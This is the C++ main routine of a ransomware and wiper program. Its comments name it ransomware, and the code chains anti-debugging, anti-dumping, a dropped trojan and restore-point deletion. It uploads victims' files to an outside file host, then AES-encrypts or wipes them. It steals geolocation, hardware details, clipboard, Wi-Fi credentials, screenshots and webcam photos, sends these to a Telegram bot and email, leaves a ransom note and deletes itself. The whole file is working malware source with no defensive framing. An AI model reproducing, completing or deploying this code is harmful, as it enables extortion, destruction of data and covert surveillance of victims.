#include "headers.h"

using namespace std;

// absolute paths or relative to here
string WallpaperContent = "./wallpaper.jpg";
string FileIconContent = "./ICON.ico";
string EmailSenderContent = "./emailSender.ps1";
string DataDecryptorContent = "../x64/Release/DataDecryptor.exe";
string CustomFileContent = "../x64/Release/debugFolder_backup/exe_example.exe";
string TrojanFileContent = "../x64/Release/debugFolder_backup/pdfsample.pdf";


int main(int argc, char* argv[]) {
    // mutex to prevent opening the ransomware multiple times and possible errors
    CreateMutexA(0, FALSE, skCrypt("Local\\$+SGSUMb/Vuib4zPiMXI6iQ==$"));
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        exit(0);

    // check if being debugged
#if ANTIDEBUG
    if (AntiDebug())
        exit(0);
#endif

    // show window if it is in debug mode
#if !DEBUG
    ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif

    // open a new thread which deletes bad open tasks
#if TSK_REMOVER
    HANDLE hThreadTaskMng = CreateThread(NULL, 0, RemoveTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
#endif

    // increase PE image size
#if ANTI_DUMPER
    ImageSizeIncreaser();
#endif

    // open a new thread which is the trojan horse
#if TROJAN
    // drop trojan file
#if DROPRUN_TROJAN_FILE
    DropFile(TrojanFileContent, TROJANFILE);
#endif
    HANDLE hThreadTrojan = CreateThread(NULL, 0, TrojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);
#endif
    
    // delete restore points
#if DELETE_RESTOREPOINT
    DeleteRestorePoints();
#endif


    // retrieve the directories in which to encrypt files
    vector<string> dirs = RetrieveFolders(argc, argv);

    // retrieve the files to be encrypted
    vector<string> files = GetFiles(dirs);

#if !WIPER
    ofstream checkFile(CHECKSUM_FILE);
    checkFile << CHECK_CONTENT;
    checkFile.close();
    files.push_back(CHECKSUM_FILE);
#endif

    vector<vector<string>> filesSplitted = VectorSplitter(files, MAX_THREADS);
    
    // change file icon
#if CHANGE_FILE_ICON
    DropFile(FileIconContent, FILESICON);
    ChangeIcon();
#endif


    thread threads[MAX_THREADS];

    // upload the files to anonfiles.com
#if FILE_UPLOADER
    for (int i = 0; i < filesSplitted.size(); i++)
        threads[i] = thread(UploadFiles, filesSplitted[i]);
    for (int i = 0; i < filesSplitted.size(); i++)  // wait for all threads to finish uploading files
        threads[i].join();
#endif

    // generate key & iv
    string key = aes_encrypt(KEYOFKEY, GenerateRandom(32), IV);
    Sleep(rand() % 500 + 1);
    string iv = aes_encrypt(KEYOFKEY, GenerateRandom(16), IV);

    // open all threads that encrypt files
    for (int i = 0; i < filesSplitted.size(); i++)
#if WIPER
        threads[i] = thread(WipeFiles, filesSplitted[i]);
#else
        threads[i] = thread(EncryptFiles, filesSplitted[i], aes_decrypt(KEYOFKEY, key, IV), aes_decrypt(KEYOFKEY, iv, IV));
#endif


    // generate infoFile content
    string infoFileContent = (string)skCrypt("");

    // info.txt content
    string info_txt = (string)skCrypt("");
#if !WIPER
    info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\\") + iv + (string)skCrypt("\n");
#endif
#if STEAL_INFO   // semi-stealer
    info_txt += (string)skCrypt("Date: ") + GetDate() + (string)skCrypt("\n");
    info_txt += (string)skCrypt("HWID: ") + GetHWID() + (string)skCrypt("\n");
    vector<string> ipData = Split(GetIPData(), '\n');
    info_txt += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
    info_txt += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Longitude: ") + ipData[4] + (string)skCrypt("\n");
    vector<string> systemData = Split(GetCPU(), '\n');
    info_txt += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
    info_txt += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Ram memory: ") + systemData[2] + (string)skCrypt("\n");
    info_txt += (string)skCrypt("GPU name: ") + GetGPU() + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Host name: ") + GetPcName() + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Username: ") + GetUsername() + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Screen resolution: ") + GetResolution() + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Windows version: ") + GetWinVersion() + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Drives: ") + GetDrives() + (string)skCrypt("\n");
    info_txt += (string)skCrypt("Language: ") + GetLanguage() + (string)skCrypt("\n");
#endif
    info_txt = aes_encrypt(KEY, info_txt, IV);
    infoFileContent += info_txt;
    infoFileContent += skCrypt("\n");

    // cryptedFiles.txt content
    string cryptedFiles_txt = (string)skCrypt("");
    for (string file : files)
        cryptedFiles_txt += file + (string)skCrypt("\n");
    cryptedFiles_txt = aes_encrypt(KEY, cryptedFiles_txt, IV);
    infoFileContent += cryptedFiles_txt;
    infoFileContent += skCrypt("\n");

    // links.txt content
    string links_txt = (string)skCrypt("");
#if FILE_UPLOADER
    for (auto elem : GetLinks())
        links_txt += elem.first + (string)skCrypt("%") + elem.second + (string)skCrypt("\n");
#endif
    links_txt = aes_encrypt(KEY, links_txt, IV);
    infoFileContent += links_txt;
    infoFileContent += skCrypt("\n");

    // clipboard.txt content
#if GET_CLIPBOARD
    infoFileContent += aes_encrypt(KEY, GetClipboard(), IV);
#endif
    infoFileContent += skCrypt("\n");

    // wifi.txt content
#if GET_WIFI
      infoFileContent += aes_encrypt(KEY, GetWifi(), IV);
#endif
    infoFileContent += skCrypt("\n");

    // screenshot.bmp content
#if GET_SCREENSHOT
    infoFileContent += aes_encrypt(KEY, GetScreenshot(), IV);
#endif
    infoFileContent += skCrypt("\n");

    // photos content
    string webcams = (string)skCrypt("");
#if TAKE_WEBCAMS
    for (string file : GetWebcams())
        webcams += file + "\n";
#endif
    webcams = aes_encrypt(KEY, webcams, IV);
    infoFileContent += webcams;
    infoFileContent += skCrypt("\n");

    // delete PE header
#if ANTI_DUMPER    // it creates problems if put first
    PEHeaderDeleter();
#endif

    // make a backup of infoFile
#if DEBUG && BACKUP_INFOFILE
    ofstream infoFileBackup(Split(INFOFILE, '\\').back());
    infoFileBackup << infoFileContent;
    infoFileBackup.close();
#endif
    
    // drop infoFile
#if (DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT)) {
    ofstream infoFile(INFOFILE);
    infoFile << infoFileContent;
    infoFile.close();
#endif

    // send infoFile to telegram bot
#if (DEBUG ? DEBUG_SEND_TGBOT : SEND_TGBOT)
    SendTelegram();
#endif

    // send infoFile to the email
#if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL)
    if (IsConnected2Internet())
        SendEmail();
    else {
        DropFile(EmailSenderContent, EMAILSENDER);
        ScheduleTask();
    }
#endif

    // remove infoFile
#if (DEBUG ? (DEBUG_SEND_EMAIL || DEBUG_SEND_TGBOT) : (SEND_EMAIL || SEND_TGBOT))
    if (remove((INFOFILE).c_str()) != 0)
        DeleteFileA((INFOFILE).c_str());
#endif


    // wait for all threads to finish encrypting files
    for (int i = 0; i < filesSplitted.size(); i++)  
        threads[i].join();
    

    // drop decryptor.exe
#if DROP_DECRYPTOR && !WIPER
    DropFile(DataDecryptorContent, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\Decryptor.exe"));
#endif

    // drop README.txt
#if DROP_README
    DropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt"), false);
#endif

    // drop custom file
#if DROP_CUSTOM_FILE
    DropFile(CustomFileContent, CUSTOMFILE_LOC);
#endif

    // change wallpaper
#if CHANGE_WALLPAPER
    ChangeWallpaper(WallpaperContent);
#endif

    // send custom command
#if SEND_CUSTOM_COMMAND
    system((CUSTOM_COMMAND).c_str());
#endif

    // debug output
#if DEBUG
    cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, info_txt, IV) << skCrypt("\n");
#if WIPER
    cout << skCrypt("Wiped ");
#else
    cout << skCrypt("Crypted ");
#endif
    cout << skCrypt("files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
#if FILE_UPLOADER
    cout << skCrypt("Links:\n") << aes_decrypt(KEY, links_txt, IV) << skCrypt("\n");
#endif
    system(skCrypt("pause"));
#endif

    // self delete
#if !DEBUG && SELFKILL
    if (argc > 0)
        DeleteMe((string)argv[0]);
#endif

    return 0;
}
